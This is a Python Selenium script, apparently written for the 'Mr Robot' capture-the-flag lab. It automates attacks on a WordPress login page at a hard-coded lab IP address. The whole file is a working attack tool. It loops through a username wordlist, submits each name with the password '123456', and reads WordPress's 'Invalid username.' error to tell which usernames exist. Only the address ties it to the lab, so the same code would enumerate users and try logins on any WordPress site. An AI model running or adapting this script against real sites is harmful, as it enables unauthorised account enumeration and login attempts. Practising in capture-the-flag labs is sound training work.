'''
Utility for http brute force.
Suitable only to M.r Robot CTF

You Need to see GUI live for some strange reason. Otherwise it will not work.
'''


from selenium import webdriver
from time import sleep

CHROME_DRIVER = "../webdriver/chromedriver"
RHOST = "10.10.129.103"
RPORT = 80
USERS_FILE = "/home/yuval/CTF/mr-robot/fsocity.dic"
BASE_URL = "http://{}/wp-login.php".format(RHOST)


def initialize_utility():
    driver = webdriver.Chrome(CHROME_DRIVER)
    driver.get(BASE_URL)
    return driver


def set_login_data(driver, username, password):
    username_input = driver.find_element_by_id("user_login")
    password_input = driver.find_element_by_id("user_pass")
    submit_button = driver.find_element_by_id("wp-submit")

    username_input.clear()
    sleep(0.1)
    username_input.send_keys(username)
    password_input.clear()
    sleep(0.1)
    password_input.send_keys(password)
    submit_button.click()
    sleep(0.5)


def is_brute_force_succeeded(driver):
    error_message = driver.find_element_by_id("login_error")
    return not (error_message is not None and "Invalid username." in error_message.text)


def brute_force_attempt(driver, username, password):
    """
    :return the success of the attempt
    """

    set_login_data(driver, username, password)
    return is_brute_force_succeeded(driver)


def brute_force_process(driver, stop_on_success=False):
    with open(USERS_FILE, "r") as users_file:
        line = users_file.readline()
        while line != "":
            username = line.strip()
            password = "123456"

            attempt_result = brute_force_attempt(driver, username, password)
            if attempt_result:
                print("Success : [username : '{}']".format(username))
                if stop_on_success:
                    break

            line = users_file.readline()


def main():
    driver = initialize_utility()
    brute_force_process(driver)


if __name__ == '__main__':
    main()